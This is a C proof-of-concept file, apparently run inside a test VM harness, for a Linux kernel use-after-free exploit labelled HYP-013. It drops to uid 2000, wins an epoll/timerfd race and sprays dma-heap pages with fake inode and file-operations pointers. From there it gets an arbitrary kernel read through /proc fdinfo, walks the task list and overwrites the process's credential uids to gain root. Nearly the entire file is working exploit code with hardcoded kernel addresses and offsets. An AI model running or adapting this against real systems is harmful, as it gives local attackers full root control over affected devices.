// test_hyp013_poc.c — HYP-013: Unassisted End-to-End Root Privilege Escalation
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/ioctl.h>
#include <linux/dma-heap.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <errno.h>

#define TOTAL_TRIALS 150000
#define RACE_DUP_CLOSE_ITERS 15
#define RACE_ENQUEUE_FORKS 2
#define RACE_WAITER_EPFDS 20
#define RACE_WAITER_DUPS 10

#define OBJS_PER_SLAB 16
#define BATCH_A_SIZE 32
#define BATCH_B_SIZE 32
#define BG_PRESSURE_FILES 4000

#define PAGES_PER_ROUND 8192

// Symbols on GKI 6.1.23 build with CONFIG_DMABUF_HEAPS_SYSTEM=y
#define INIT_TASK_ADDR      0xffffffc00973dac0ULL
#define SWAPS_PROC_OPS_ADDR 0xffffffc009123200ULL
#define FAKE_FOPS_ADDR      (SWAPS_PROC_OPS_ADDR - 0x48)

// Offsets in struct task_struct
#define OFF_TASKS 1232
#define OFF_PID   1456
#define OFF_CRED  1928
#define OFF_COMM  1944

// Offsets in struct cred
#define OFF_CRED_UID   4
#define OFF_CRED_EUID  20
#define OFF_CRED_FSUID 28

static inline uint64_t mono_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static inline void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

static volatile int g_race_ready_main = 0;
static volatile int g_race_ready_racer = 0;
static volatile int g_race_done = 0;
static volatile int g_ep_race_waiter = -1;
static volatile uint64_t g_time_false_sharing = 10000;
static volatile int g_stop_racer = 0;
static int g_timerfd_wakeup = -1;
static struct epoll_event g_ev = { .events = EPOLLIN | EPOLLOUT };

static void setup_timerfd_waiters(int tfd) {
    for (int i = 0; i < RACE_ENQUEUE_FORKS; i++) {
        if (fork() == 0) {
            pin_to_cpu(0);
            int epfds[RACE_WAITER_EPFDS];
            for (int j = 0; j < RACE_WAITER_EPFDS; j++) {
                epfds[j] = epoll_create1(0);
                for (int k = 0; k < RACE_WAITER_DUPS; k++) {
                    int dupfd = dup(tfd);
                    struct epoll_event ev = { .events = EPOLLIN, .data.fd = dupfd };
                    epoll_ctl(epfds[j], EPOLL_CTL_ADD, dupfd, &ev);
                }
            }
            while (1) sleep(1000);
            exit(0);
        }
    }
}

static void *racer_thread_func(void *arg) {
    pin_to_cpu(0);
    uint64_t launch_ahead_ns = 2500;
    while (!g_stop_racer) {
        while (!g_race_ready_main && !g_stop_racer) sched_yield();
        if (g_stop_racer) break;

        g_race_ready_main = 0;
        g_race_ready_racer = 1;

        uint64_t t_now = mono_ns();
        uint64_t t_fire = t_now + g_time_false_sharing / 2;
        struct itimerspec its;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_sec = t_fire / 1000000000ULL;
        its.it_value.tv_nsec = t_fire % 1000000000ULL;
        timerfd_settime(g_timerfd_wakeup, TFD_TIMER_ABSTIME, &its, NULL);

        uint64_t t_close = t_fire > launch_ahead_ns ? (t_fire - launch_ahead_ns) : t_fire;
        while (mono_ns() < t_close) {}

        close(g_ep_race_waiter);
        g_race_done = 1;
    }
    return NULL;
}

static int check_survivor_fdinfo(int epfd) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[512] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    if (strstr(buf, "tfd:") != NULL) return 1;
    return 0;
}

static long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

static int read_fdinfo_ino(int epfd, char *out_buf, size_t max_len, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, out_buf, max_len - 1);
    close(fd);
    if (n <= 0) return -1;
    out_buf[n] = '\0';

    char *tfd_str = strstr(out_buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    *out_ino = 0;
    return -1;
}

static uint64_t aar_read64(int epA, void **spray_pages, int num_pages, uint64_t target_addr) {
    uint64_t fake_inode = target_addr - 0x40;
    for (int p = 0; p < num_pages; p++) {
        char *page = (char *)spray_pages[p];
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(page + off + 32) = fake_inode;
        }
    }
    char fdinfo_buf[512] = {0};
    unsigned long val = 0;
    if (read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &val) == 0) return val;
    return 0;
}

static int setup_dmabuf_devnode(void) {
    int sys_fd = open("/sys/class/dma_heap/system/dev", O_RDONLY);
    if (sys_fd < 0) return -1;
    char dev_str[32] = {0};
    int n = read(sys_fd, dev_str, sizeof(dev_str) - 1);
    close(sys_fd);
    if (n <= 0) return -1;
    dev_str[n] = '\0';

    int major = 0, minor = 0;
    if (sscanf(dev_str, "%d:%d", &major, &minor) != 2) return -1;

    mkdir("/dev/dma_heap", 0755);
    unlink("/dev/dma_heap/system");
    if (mknod("/dev/dma_heap/system", S_IFCHR | 0666, makedev(major, minor)) < 0) return -1;
    chmod("/dev/dma_heap/system", 0666);
    return 0;
}

int main(int argc, char **argv) {
    print_str("=========================================================\n");
    print_str("=== HYP-013: Unassisted End-to-End E2E Exploit (PoC) ===\n");
    print_str("=========================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));
    chmod("/dev/null", 0666);

    setup_dmabuf_devnode();

    // Drop privileges
    if (setresgid(2000, 2000, 2000) != 0 || setresuid(2000, 2000, 2000) != 0) {
        perror("[-] Failed to drop privileges");
        return 1;
    }
    if (getuid() != 2000) {
        print_str("[-] Failed to verify privilege drop\n");
        return 1;
    }
    print_str("[+] Privileges dropped to uid=2000. Commencing unassisted exploit...\n");

    pin_to_cpu(1);

    g_timerfd_wakeup = timerfd_create(CLOCK_MONOTONIC, 0);
    if (g_timerfd_wakeup >= 0) {
        setup_timerfd_waiters(g_timerfd_wakeup);
        print_str("[+] Timerfd interrupt widening queue configured.\n");
    }

    int bg_fds[BG_PRESSURE_FILES];
    for (int i = 0; i < BG_PRESSURE_FILES; i++) bg_fds[i] = eventfd(0, 0);

    pthread_t racer_th;
    pthread_create(&racer_th, NULL, racer_thread_func, NULL);

    char logbuf[512];
    snprintf(logbuf, sizeof(logbuf), "[*] Starting N=%d natural two-stage race iterations...\n", TOTAL_TRIALS);
    print_str(logbuf);

    int dma_heap_fd = open("/dev/dma_heap/system", O_RDWR);
    if (dma_heap_fd < 0) {
        perror("[-] Failed to open dma_heap");
        return 1;
    }

    int race_wins = 0;
    int reclaim_hits = 0;
    int fires = 0;

    for (int iter = 1; iter <= TOTAL_TRIALS; iter++) {
        int ep_race_waiter = epoll_create1(0);
        int ep_race_target = epoll_create1(0);
        int ep_uaf_waiter = epoll_create1(0);

        if (ep_race_waiter < 0 || ep_race_target < 0 || ep_uaf_waiter < 0) {
            if (ep_race_waiter >= 0) close(ep_race_waiter);
            if (ep_race_target >= 0) close(ep_race_target);
            if (ep_uaf_waiter >= 0) close(ep_uaf_waiter);
            continue;
        }

        epoll_ctl(ep_race_waiter, EPOLL_CTL_ADD, ep_race_target, &g_ev);

        int batch_a_fds[BATCH_A_SIZE];
        for (int i = 0; i < BATCH_A_SIZE; i++) batch_a_fds[i] = open("/dev/null", O_RDONLY);

        g_ep_race_waiter = ep_race_waiter;
        g_race_ready_main = 1;
        while (!g_race_ready_racer) sched_yield();
        g_race_ready_racer = 0;

        uint64_t t0 = mono_ns();
        for (int j = 0; j < RACE_DUP_CLOSE_ITERS; j++) close(dup(ep_race_target));
        g_time_false_sharing = mono_ns() - t0;

        close(ep_race_target);

        int ep_uaf_target = epoll_create1(0);

        int armed_efd = -1;
        if (ep_uaf_target >= 0) {
            epoll_ctl(ep_uaf_waiter, EPOLL_CTL_ADD, ep_uaf_target, &g_ev);
            armed_efd = eventfd(1, EFD_NONBLOCK);
            struct epoll_event armed_ev = { .events = EPOLLIN, .data.fd = armed_efd };
            epoll_ctl(ep_uaf_target, EPOLL_CTL_ADD, armed_efd, &armed_ev);
        }

        int batch_b_fds[BATCH_B_SIZE];
        for (int i = 0; i < BATCH_B_SIZE; i++) batch_b_fds[i] = open("/dev/null", O_RDONLY);

        while (!g_race_done) sched_yield();
        g_race_done = 0;

        if (ep_uaf_target >= 0) close(ep_uaf_target);

        if (check_survivor_fdinfo(ep_uaf_waiter)) {
            race_wins++;
            snprintf(logbuf, sizeof(logbuf), "[+] NATURAL RACE HIT! Iteration %d. Executing victim sandwich drain...\n", iter);
            print_str(logbuf);

            long slabs_before = read_filp_slabs_count();
            for (int i = 0; i < BATCH_A_SIZE; i++) close(batch_a_fds[i]);
            for (int i = 0; i < BATCH_B_SIZE; i++) close(batch_b_fds[i]);
            for (int i = 0; i < BG_PRESSURE_FILES; i++) close(bg_fds[i]);
            if (armed_efd >= 0) close(armed_efd);

            sleep(2);
            long slabs_after = read_filp_slabs_count();
            snprintf(logbuf, sizeof(logbuf), "[*] Slab drain complete: %ld -> %ld slabs.\n", slabs_before, slabs_after);
            print_str(logbuf);

            void *spray_pages[PAGES_PER_ROUND];
            int dma_fds[PAGES_PER_ROUND];
            uint64_t initial_fake_inode = INIT_TASK_ADDR + OFF_COMM - 0x40;

            for (int i = 0; i < PAGES_PER_ROUND; i++) {
                struct dma_heap_allocation_data alloc = { .len = 4096, .fd_flags = O_RDWR | O_CLOEXEC, .heap_flags = 0 };
                ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
                dma_fds[i] = alloc.fd;
                void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
                spray_pages[i] = p;
                char *page = (char *)p;
                for (size_t off = 0; off < 4096; off += 256) {
                    *(uint64_t *)(page + off + 32)  = initial_fake_inode;
                    *(uint64_t *)(page + off + 40)  = FAKE_FOPS_ADDR;
                    *(uint64_t *)(page + off + 56)  = 1ULL;
                    *(uint64_t *)(page + off + 184) = 0xDEADF11EULL;
                    *(uint64_t *)(page + off + 200) = 0ULL;
                }
            }

            char fdinfo_buf[512] = {0};
            unsigned long read_ino = 0;
            read_fdinfo_ino(ep_uaf_waiter, fdinfo_buf, sizeof(fdinfo_buf), &read_ino);

            if (read_ino == 0x2f72657070617773ULL) {
                reclaim_hits++;
                print_str("[+] AAR Oracle Hit! ('swapper/'). Commencing AAR task walk...\n");
                uint64_t curr_task = INIT_TASK_ADDR;
                uint64_t harness_cred = 0;
                pid_t my_pid = getpid();

                for (int step = 0; step < 50; step++) {
                    uint64_t c1 = aar_read64(ep_uaf_waiter, spray_pages, PAGES_PER_ROUND, curr_task + OFF_COMM);
                    uint64_t c2 = aar_read64(ep_uaf_waiter, spray_pages, PAGES_PER_ROUND, curr_task + OFF_COMM + 8);
                    uint64_t task_pid = aar_read64(ep_uaf_waiter, spray_pages, PAGES_PER_ROUND, curr_task + OFF_PID) & 0xFFFFFFFF;
                    uint64_t task_cred = aar_read64(ep_uaf_waiter, spray_pages, PAGES_PER_ROUND, curr_task + OFF_CRED);
                    char t_comm[17] = {0};
                    memcpy(t_comm, &c1, 8);
                    memcpy(t_comm + 8, &c2, 8);

                    if ((int)task_pid == my_pid || strstr(t_comm, "harness") != NULL) {
                        harness_cred = task_cred;
                        snprintf(logbuf, sizeof(logbuf), "[+] Found harness task! pid=%d comm='%s' cred=0x%lx\n", (int)task_pid, t_comm, task_cred);
                        print_str(logbuf);
                        break;
                    }
                    uint64_t next_tasks_head = aar_read64(ep_uaf_waiter, spray_pages, PAGES_PER_ROUND, curr_task + OFF_TASKS);
                    if (next_tasks_head == 0 || next_tasks_head == (INIT_TASK_ADDR + OFF_TASKS)) break;
                    curr_task = next_tasks_head - OFF_TASKS;
                }

                if (harness_cred != 0) {
                    uint64_t uid_val = aar_read64(ep_uaf_waiter, spray_pages, PAGES_PER_ROUND, harness_cred + OFF_CRED_UID) & 0xFFFFFFFF;
                    if (uid_val == 2000) {
                        print_str("[+] AAR verified cred.uid == 2000. Commencing gated swaps_poll writes...\n");
                        struct epoll_event res_events[4];

                        // Zero cred.uid
                        for (int p=0; p<PAGES_PER_ROUND; p++) {
                            for (size_t off=0; off<4096; off+=256) {
                                *(uint64_t *)((char*)spray_pages[p] + off + 32) = INIT_TASK_ADDR + OFF_COMM - 0x40;
                                *(uint64_t *)((char*)spray_pages[p] + off + 200) = (harness_cred + OFF_CRED_UID) - 96;
                            }
                        }
                        if (read_fdinfo_ino(ep_uaf_waiter, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) == 0 && read_ino == 0x2f72657070617773ULL) {
                            epoll_wait(ep_uaf_waiter, res_events, 4, 0);
                            fires++;
                        }

                        // Zero cred.euid
                        for (int p=0; p<PAGES_PER_ROUND; p++) {
                            for (size_t off=0; off<4096; off+=256) {
                                *(uint64_t *)((char*)spray_pages[p] + off + 200) = (harness_cred + OFF_CRED_EUID) - 96;
                            }
                        }
                        if (read_fdinfo_ino(ep_uaf_waiter, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) == 0 && read_ino == 0x2f72657070617773ULL) {
                            epoll_wait(ep_uaf_waiter, res_events, 4, 0);
                            fires++;
                        }

                        // Zero cred.fsuid
                        for (int p=0; p<PAGES_PER_ROUND; p++) {
                            for (size_t off=0; off<4096; off+=256) {
                                *(uint64_t *)((char*)spray_pages[p] + off + 200) = (harness_cred + OFF_CRED_FSUID) - 96;
                            }
                        }
                        if (read_fdinfo_ino(ep_uaf_waiter, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) == 0 && read_ino == 0x2f72657070617773ULL) {
                            epoll_wait(ep_uaf_waiter, res_events, 4, 0);
                            fires++;
                        }

                        if (getuid() == 0) {
                            print_str("========================================================\n");
                            print_str("[+ SUCCESS +] E2E ROOT PRIVILEGE ESCALATION ACHIEVED (UID 0)!\n");
                            print_str("========================================================\n");
                            reboot(RB_POWER_OFF);
                            return 0;
                        } else {
                            print_str("[-] Exploit completed but getuid() != 0. Reclaim might have collided safely.\n");
                        }
                    } else {
                        print_str("[-] AAR cred.uid != 2000. Incorrect task struct parsed.\n");
                    }
                }
            } else {
                print_str("[-] AAR Oracle Miss. Reclaim failed. Cleaning up for retry...\n");
            }

            // Cleanup for next iteration
            close(ep_uaf_waiter);
            for (int i = 0; i < PAGES_PER_ROUND; i++) {
                munmap(spray_pages[i], 4096);
                close(dma_fds[i]);
            }
            for (int i = 0; i < BG_PRESSURE_FILES; i++) bg_fds[i] = eventfd(0, 0);
            continue;
        }

        // No survivor
        close(ep_uaf_waiter);
        for (int i = 0; i < BATCH_A_SIZE; i++) close(batch_a_fds[i]);
        for (int i = 0; i < BATCH_B_SIZE; i++) close(batch_b_fds[i]);
        if (armed_efd >= 0) close(armed_efd);

        if (iter % 1000 == 0) {
            snprintf(logbuf, sizeof(logbuf), "[*] Completed %d / %d iterations...\n", iter, TOTAL_TRIALS);
            print_str(logbuf);
        }
    }

    g_stop_racer = 1;
    pthread_join(racer_th, NULL);
    snprintf(logbuf, sizeof(logbuf), "[-] Failed to achieve root within iteration limit.\n[*] TELEMETRY: Race Wins: %d | Reclaim Hits: %d | Fires: %d\n", race_wins, reclaim_hits, fires);
    print_str(logbuf);
    reboot(RB_POWER_OFF);
    return 1;
}
